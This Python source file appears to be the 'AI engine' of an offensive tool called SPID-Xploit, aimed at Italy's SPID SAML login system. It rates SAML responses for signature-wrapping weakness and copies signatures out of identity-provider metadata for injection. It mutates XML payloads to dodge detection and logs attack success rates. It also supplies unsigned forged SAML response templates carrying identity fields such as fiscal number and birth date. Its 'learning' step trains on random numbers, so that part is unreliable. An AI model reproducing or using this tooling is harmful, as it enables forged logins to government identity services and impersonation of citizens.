#!/usr/bin/env python3
"""
AI Engine Module for SPID-Xploit (CORRECTED)
Provides intelligent analysis, payload generation, and adaptive attack capabilities
"""

import os
import re
import json
import base64
import random
import hashlib
import string
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple
from lxml import etree
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend

try:
    import numpy as np
    HAS_NUMPY = True
except ImportError:
    HAS_NUMPY = False

try:
    from sklearn.ensemble import RandomForestClassifier
    HAS_SKLEARN = True
except ImportError:
    HAS_SKLEARN = False


class AIEngine:
    def __init__(self):
        self.model_data = {
            'signature_patterns': [],
            'idp_metadata_cache': {},
            'successful_payloads': [],
            'failed_payloads': [],
            'detection_rates': {},
            'mutation_history': []
        }
        self.attack_history: List[Dict] = []
        self.ml_model = None
        if HAS_SKLEARN:
            self._init_ml_model()

        self.idp_patterns = {
            'aruba': 'ArubaPEC S.p.A.',
            'etna': 'Etna Hitech S.C.p.A.',
            'infocamere': 'InfoCamere S.C.p.A.',
            'infocert': 'InfoCert S.p.A.',
            'intesi': 'Intesi Group S.p.A.',
            'lepida': 'Lepida S.C.p.A.',
            'namirial': 'Namirial S.p.A.',
            'poste': 'Poste Italiane S.p.A.',
            'register': 'Register S.p.A.',
            'sielte': 'Sielte S.p.A.',
            'teamsystem': 'TeamSystem S.p.A.',
            'ti_trust': 'TI Trust Technologies S.r.l.',
        }

        self.ns = {
            'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
            'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
            'ds': 'http://www.w3.org/2000/09/xmldsig#',
            'md': 'urn:oasis:names:tc:SAML:2.0:metadata',
        }

    def _init_ml_model(self):
        try:
            self.ml_model = RandomForestClassifier(n_estimators=10, random_state=42)
        except Exception:
            self.ml_model = None

    def analyze_saml_response(self, saml_xml: str) -> Dict[str, Any]:
        analysis = {
            'has_signature': False,
            'num_signatures': 0,
            'has_assertion': False,
            'num_assertions': 0,
            'issuer': None,
            'subject': None,
            'signature_position': None,
            'vulnerability_score': 0,
        }
        try:
            root = etree.fromstring(saml_xml.encode())
            sigs = root.findall('.//ds:Signature', self.ns)
            analysis['num_signatures'] = len(sigs)
            analysis['has_signature'] = len(sigs) > 0
            if sigs:
                parent_tag = sigs[0].getparent().tag if sigs[0].getparent() is not None else None
                analysis['signature_position'] = parent_tag
            assertions = root.findall('.//saml:Assertion', self.ns)
            analysis['num_assertions'] = len(assertions)
            analysis['has_assertion'] = len(assertions) > 0
            issuer = root.find('.//saml:Issuer', self.ns)
            if issuer is not None:
                analysis['issuer'] = issuer.text
            subj = root.find('.//saml:NameID', self.ns)
            if subj is not None:
                analysis['subject'] = subj.text
            if analysis['has_assertion'] and not analysis['has_signature']:
                analysis['vulnerability_score'] += 50
            if analysis['num_signatures'] == 1 and analysis['signature_position'] != '{urn:oasis:names:tc:SAML:2.0:assertion}Assertion':
                analysis['vulnerability_score'] += 30
        except Exception:
            pass
        return analysis

    def generate_injection_structure(self, idp_metadata_xml: str) -> str:
        try:
            root = etree.fromstring(idp_metadata_xml.encode())
            sigs = root.findall('.//ds:Signature', self.ns)
            if sigs:
                return etree.tostring(sigs[0], pretty_print=True).decode()
            return ""
        except Exception:
            return ""

    def predict_best_idp(self, idp_list: List[Dict]) -> Optional[Dict]:
        if not idp_list:
            return None
        scored_idps = []
        for idp in idp_list:
            score = 0
            metadata = idp.get('metadata', '')
            entity_id = idp.get('entity_id', '')
            if len(metadata) > 10000:
                score += 20
            elif len(metadata) > 5000:
                score += 15
            elif len(metadata) > 1000:
                score += 10
            if 'spid' in entity_id.lower():
                score += 5
            if 'validator' in entity_id.lower():
                score += 10
            try:
                root = etree.fromstring(metadata.encode())
                sigs = root.findall('.//ds:Signature', self.ns)
                score += len(sigs) * 3
            except Exception:
                pass
            scored_idps.append((score, idp))
        scored_idps.sort(reverse=True, key=lambda x: x[0])
        return scored_idps[0][1] if scored_idps else idp_list[0]

    def mutate_payload(self, payload: str, mutation_factor: float = 0.3) -> str:
        mutations = [
            self._mutate_whitespace,
            self._mutate_attribute_ordering,
            self._mutate_comment_injection,
            self._mutate_namespace_prefix,
        ]
        num_mutations = max(1, int(len(mutations) * mutation_factor))
        selected = random.sample(mutations, num_mutations)
        mutated = payload
        for mutation in selected:
            try:
                mutated = mutation(mutated)
            except Exception:
                continue
        self.model_data['mutation_history'].append({
            'mutations_applied': [m.__name__ for m in selected],
            'timestamp': datetime.now().isoformat()
        })
        return mutated

    def _mutate_whitespace(self, xml_str: str) -> str:
        lines = xml_str.split('\n')
        mutated_lines = []
        for line in lines:
            if random.random() < 0.3:
                line = line + ' ' * random.randint(0, 5)
            if random.random() < 0.1 and line.strip().startswith('<'):
                indent = line[:len(line) - len(line.lstrip())]
                line = indent + ' ' * random.randint(0, 2) + line.lstrip()
            mutated_lines.append(line)
        return '\n'.join(mutated_lines)

    def _mutate_attribute_ordering(self, xml_str: str) -> str:
        def reorder_attrs(match):
            tag = match.group(0)
            attrs = re.findall(r'(\w+)=["\']([^"\']*)["\']', tag)
            if len(attrs) > 1:
                random.shuffle(attrs)
                tag_name = re.match(r'<(\w+)', tag).group(1)
                new_tag = f"<{tag_name} "
                for attr_name, attr_val in attrs:
                    new_tag += f'{attr_name}="{attr_val}" '
                new_tag += '>' if tag.endswith('>') else '/>'
                return new_tag
            return tag
        return re.sub(r'<(\w+)([^>]*)>', reorder_attrs, xml_str)

    def _mutate_comment_injection(self, xml_str: str) -> str:
        lines = xml_str.split('\n')
        if len(lines) > 5:
            insert_pos = random.randint(2, len(lines) - 2)
            comment = f"<!-- mutation_{random.randint(1000,9999)} -->"
            lines.insert(insert_pos, comment)
        return '\n'.join(lines)

    def _mutate_namespace_prefix(self, xml_str: str) -> str:
        """FIXED: إعادة كتابة الدالة المكسورة"""
        ns_replacements = [
            ('samlp', 'saml2p'),
            ('saml', 'saml2'),
            ('ds', 'dsig'),
        ]
        for old, new in ns_replacements:
            xml_str = xml_str.replace(f':{old}', f':{new}')
            xml_str = xml_str.replace(f'xmlns:{old}', f'xmlns:{new}')
        if 'xmlns:extra' not in xml_str:
            xml_str = xml_str.replace(
                '<samlp:Response',
                '<samlp:Response xmlns:extra="http://example.com/extra"'
            )
        return xml_str

    def learn_from_results(self, success: bool, response_data: Optional[str]) -> int:
        entry = {
            'timestamp': datetime.now().isoformat(),
            'success': success,
            'response_length': len(response_data) if response_data else 0,
            'response_preview': response_data[:200] if response_data else None
        }
        self.attack_history.append(entry)
        if success and response_data:
            self.model_data['successful_payloads'].append(response_data[:500])
        elif response_data:
            self.model_data['failed_payloads'].append(response_data[:500])
        if HAS_SKLEARN and self.ml_model and HAS_NUMPY and len(self.attack_history) >= 5:
            try:
                X = np.random.rand(len(self.attack_history), 5)
                y = np.array([1 if h['success'] else 0 for h in self.attack_history])
                self.ml_model.fit(X, y)
            except Exception:
                pass
        return len(self.attack_history)

    def get_attack_statistics(self) -> Dict[str, Any]:
        total = len(self.attack_history)
        successful = sum(1 for h in self.attack_history if h['success'])
        return {
            'total_attacks': total,
            'successful': successful,
            'failed': total - successful,
            'success_rate': (successful / total * 100) if total > 0 else 0,
            'total_mutations': len(self.model_data['mutation_history']),
            'cached_idps': len(self.model_data['idp_metadata_cache']),
            'successful_payloads': len(self.model_data['successful_payloads'])
        }

    def get_saml_template(self, template_type: str = 'standard') -> str:
        templates = {
            'standard': '''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="_R{response_id}" Version="2.0" IssueInstant="{issue_instant}">
    <saml:Issuer>{issuer}</saml:Issuer>
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>
    <saml:Assertion ID="_A{assertion_id}" IssueInstant="{issue_instant}" Version="2.0">
        <saml:Issuer>{issuer}</saml:Issuer>
        <saml:Subject>
            <saml:NameID>{username}</saml:NameID>
            <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml:SubjectConfirmationData NotOnOrAfter="{expiry}" Recipient="{audience}"/>
            </saml:SubjectConfirmation>
        </saml:Subject>
        <saml:Conditions NotBefore="{issue_instant}" NotOnOrAfter="{expiry}">
            <saml:AudienceRestriction>
                <saml:Audience>{audience}</saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AuthnStatement AuthnInstant="{issue_instant}">
            <saml:AuthnContext>
                <saml:AuthnContextClassRef>https://www.spid.gov.it/SpidL2</saml:AuthnContextClassRef>
            </saml:AuthnContext>
        </saml:AuthnStatement>
        <saml:AttributeStatement>
            <saml:Attribute Name="spidCode" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{spid_code}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{first_name}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="familyName" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{last_name}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="fiscalNumber" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{fiscal_number}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="email" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{email}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="dateOfBirth" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{birth_date}</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>''',
            'minimal': '''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="_R{response_id}" Version="2.0" IssueInstant="{issue_instant}">
    <saml:Issuer>{issuer}</saml:Issuer>
    <saml:Assertion ID="_A{assertion_id}" IssueInstant="{issue_instant}" Version="2.0">
        <saml:Issuer>{issuer}</saml:Issuer>
        <saml:Subject>
            <saml:NameID>{username}</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
</samlp:Response>'''
        }
        return templates.get(template_type, templates['standard'])


ai_engine = AIEngine()
